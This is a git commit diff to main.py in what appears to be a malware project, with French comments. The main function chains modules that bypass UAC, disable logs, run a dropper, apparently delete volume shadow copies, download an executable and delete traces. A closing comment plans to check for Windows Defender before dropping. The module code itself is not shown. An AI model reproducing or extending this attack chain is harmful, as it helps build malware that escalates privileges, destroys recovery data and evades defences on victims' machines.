e28fda15950a81d35bbdd898e470af3e4aef824a
Clement <48801402+Clement17-rouault@users.noreply.github.com>
2022-07-14 18:20:51 +0200

    Update main.py

--- main.py
+++ main.py
@@ -6,14 +6,20 @@ import disable_logs
 import vss
 #import deletefile
 
+
+
 def main():
     if bypass_uac.main() and disable_logs.main() and Dropper.main() and vss.main():
-        if download_exe.main():    
-            print("Marche")
-            delete_trace.main()
-            input_ = input("Appuyer sur Enter ...")
-        
+        download_exe.main()
+        """ 
+        print("Marche")
+        delete_trace.main()
+        input_ = input("Appuyer sur Enter ...")
+        """
     else:
         delete_trace.main()
 
-main()
+if __name__ == '__main__':
+    main()
+
+#Ajouter la verification pour savoir si c'est windows defender qui est utilisé ou non pour faire le Dropper
